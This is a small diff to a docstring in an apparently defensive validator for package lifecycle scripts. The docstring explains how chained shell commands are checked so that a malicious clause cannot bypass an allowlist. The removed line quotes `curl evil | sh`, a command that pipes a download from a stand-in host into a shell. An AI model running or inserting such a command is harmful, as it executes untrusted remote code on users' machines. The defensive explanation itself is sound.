@@ -437,7 +437,7 @@ class ManifestScripts:
         """Whether a lifecycle command is a recognised build step.
 
         Compared against the whole command after stripping shell chaining, so
-        `node-gyp rebuild && curl evil | sh` is not waved through by its first
+        `node-gyp rebuild && <a download piped to a shell>` is not waved through by its first
         clause -- which is how an allowlist that matched a prefix of the raw string
         would have been defeated in one move. `npm run X` is judged by what script `X` runs,
         three levels deep at most; a tool is judged by where its package comes from.
